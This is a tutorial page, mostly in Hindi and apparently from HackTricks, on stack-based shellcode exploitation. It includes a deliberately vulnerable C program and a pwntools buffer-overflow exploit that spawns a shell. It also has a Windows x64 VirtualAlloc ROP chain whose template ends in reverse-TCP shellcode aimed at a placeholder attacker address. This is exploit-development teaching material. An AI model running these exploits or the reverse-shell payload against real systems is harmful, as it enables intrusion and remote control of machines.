# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

**Stack shellcode** एक तकनीक है जो **binary exploitation** में इस्तेमाल होती है, जहाँ एक हमलावर vulnerable प्रोग्राम के stack पर shellcode लिखता है और फिर Instruction Pointer (IP) या Extended Instruction Pointer (EIP) को इस shellcode के पते पर बदल देता है, जिससे वह execute हो जाता है। यह लक्ष्य सिस्टम पर अनधिकृत पहुँच प्राप्त करने या arbitrary commands execute करने का एक क्लासिक तरीका है। नीचे प्रक्रिया का विवरण दिया गया है, जिसमें एक सरल C उदाहरण और यह दिखाया गया है कि आप Python के साथ **pwntools** का उपयोग करके संबंधित exploit कैसे लिख सकते हैं।

### C उदाहरण: एक कमजोर प्रोग्राम

आइए एक सरल कमजोर C प्रोग्राम के उदाहरण से शुरू करें:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
यह प्रोग्राम `gets()` फ़ंक्शन के उपयोग के कारण एक buffer overflow के प्रति vulnerable है।

### कम्पाइल करना

विभिन्न सुरक्षा व्यवस्थाओं को अक्षम करते हुए (एक vulnerable environment का अनुकरण करने के लिए), आप इस प्रोग्राम को कम्पाइल करने के लिए निम्नलिखित कमांड का उपयोग कर सकते हैं:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Stack protection को अक्षम करता है।
- `-z execstack`: Stack को executable बनाता है, जो कि stack पर संग्रहित shellcode को execute करने के लिए आवश्यक है।
- `-no-pie`: Position Independent Executable को अक्षम करता है, जिससे यह अनुमान लगाना आसान हो जाता है कि हमारे shellcode का memory address कहाँ स्थित होगा।
- `-m32`: प्रोग्राम को 32-bit executable के रूप में compile करता है, जो अक्सर exploit development में सरलता के लिए उपयोग किया जाता है।

### Python Exploit using Pwntools

यहाँ बताया गया है कि आप Python में **pwntools** का उपयोग करके एक **ret2shellcode** attack कैसे लिख सकते हैं:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
This script constructs a payload consisting of a **NOP slide**, the **shellcode**, and then overwrites the **EIP** with the address pointing to the NOP slide, ensuring the shellcode gets executed.

The **NOP slide** (`asm('nop')`) is used to increase the chance that execution will "slide" into our shellcode regardless of the exact address. Adjust the `p32()` argument to the starting address of your buffer plus an offset to land in the NOP slide.

## Windows x64: Bypass NX with VirtualAlloc ROP (ret2stack shellcode)

आधुनिक Windows पर stack non-executable (DEP/NX) होता है। stack-resident shellcode को stack BOF के बाद भी execute कराने का एक सामान्य तरीका यह है कि एक 64-bit ROP chain बनाया जाए जो module की Import Address Table (IAT) से VirtualAlloc (या VirtualProtect) को कॉल करे ताकि stack का एक region executable बनाया जा सके और फिर chain के तुरंत बाद जोड़ी गई shellcode में return किया जा सके।

Key points (Win64 calling convention):
- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress → वर्तमान stack में कोई address चुनें (उदा., RSP) ताकि newly allocated RWX region आपके payload के साथ overlap करे
- RDX = dwSize → आपकी chain + shellcode के लिए पर्याप्त बड़ा (उदा., 0x1000)
- R8  = flAllocationType = MEM_COMMIT (0x1000)
- R9  = flProtect = PAGE_EXECUTE_READWRITE (0x40)
- Return directly into the shellcode placed right after the chain.

Minimal strategy:
1) Leak a module base (e.g., via a format-string, object pointer, etc.) to compute absolute gadget and IAT addresses under ASLR.
2) Find gadgets to load RCX/RDX/R8/R9 (pop or mov/xor-based sequences) and a call/jmp [VirtualAlloc@IAT]. If you lack direct pop r8/r9, use arithmetic gadgets to synthesize constants (e.g., set r8=0 and repeatedly add r9=0x40 forty times to reach 0x1000).
3) Place stage-2 shellcode immediately after the chain.

Example layout (conceptual):
```
# ... padding up to saved RIP ...
# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
POP_R9_RET; 0x40
# R8 = 0x1000 (MEM_COMMIT) — if no POP R8, derive via arithmetic
POP_R8_RET; 0x1000
# RCX = &stack (lpAddress)
LEA_RCX_RSP_RET    # or sequence: load RSP into a GPR then mov rcx, reg
# RDX = size (dwSize)
POP_RDX_RET; 0x1000
# Call VirtualAlloc via the IAT
[IAT_VirtualAlloc]
# New RWX memory at RCX — execution continues at the next stack qword
JMP_SHELLCODE_OR_RET
# ---- stage-2 shellcode (x64) ----
```
एक सीमित gadget set के साथ, आप register values को अप्रत्यक्ष रूप से तैयार कर सकते हैं, उदाहरण के लिए:
- mov r9, rbx; mov r8, 0; add rsp, 8; ret → r9 को rbx से सेट करें, r8 को शून्य करें, और स्टैक को एक junk qword से समायोजित करें।
- xor rbx, rsp; ret → rbx को वर्तमान stack pointer से seed करें।
- push rbx; pop rax; mov rcx, rax; ret → RSP-derived value को RCX में move करें।

Pwntools खाका (दिए गए known base और gadgets के साथ):
```python
from pwn import *
base = 0x7ff6693b0000
IAT_VirtualAlloc = base + 0x400000  # example: resolve via reversing
rop  = b''
# r9 = 0x40
rop += p64(base+POP_RBX_RET) + p64(0x40)
rop += p64(base+MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'
# rcx = rsp
rop += p64(base+POP_RBX_RET) + p64(0)
rop += p64(base+XOR_RBX_RSP_RET)
rop += p64(base+PUSH_RBX_POP_RAX_RET)
rop += p64(base+MOV_RCX_RAX_RET)
# r8 = 0x1000 via arithmetic if no pop r8
for _ in range(0x1000//0x40):
rop += p64(base+ADD_R8_R9_ADD_RAX_R8_RET)
# rdx = 0x1000 (use any available gadget)
rop += p64(base+POP_RDX_RET) + p64(0x1000)
# call VirtualAlloc and land in shellcode
rop += p64(IAT_VirtualAlloc)
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", ATTACKER_PORT))
```
टिप्स:
- VirtualProtect समान तरीके से काम करता है यदि किसी existing buffer को RX बनाना बेहतर हो; पैरामीटर क्रम अलग होता है।
- यदि stack space तंग है, तो stack को फिर से उपयोग करने की बजाय RWX कहीं और allocate करें (RCX=NULL) और उस नए region पर jmp करें।
- ऐसे gadgets जिनसे RSP बदलता है (e.g., add rsp, 8; ret) हमेशा ध्यान में रखें और बीच में junk qwords डालें।

- [**ASLR**](../../common-binary-protections-and-bypasses/aslr/index.html) **should be disabled** ताकि address executions के बीच भरोसेमंद रहे; अन्यथा जिस address पर function store होगा वह हमेशा एक सा नहीं होगा और आपको यह पता लगाने के लिए कुछ leak चाहिए होगा कि win function कहाँ लोड है।
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) को भी disabled होना चाहिए वरना compromised EIP return address कभी follow नहीं होगा।
- [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** protection shellcode के stack के अंदर execution को रोक देगा क्योंकि वह region executable नहीं होगा।

## अन्य उदाहरण और संदर्भ

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64bit, ASLR के साथ stack address leak, shellcode लिखें और उस पर jump करें
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 bit, ASLR के साथ stack leak, shellcode लिखें और उस पर jump करें
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 bit, ASLR के साथ stack leak, exit() कॉल रोकने के लिए comparison, किसी variable को एक value से overwrite करना और shellcode लिखकर उस पर jump करना
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64, ASLR नहीं, ROP gadget से stack को executable बनाकर stack में मौजूद shellcode पर jump करना


## संदर्भ

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [VirtualAlloc documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

{{#include ../../../banners/hacktricks-training.md}}
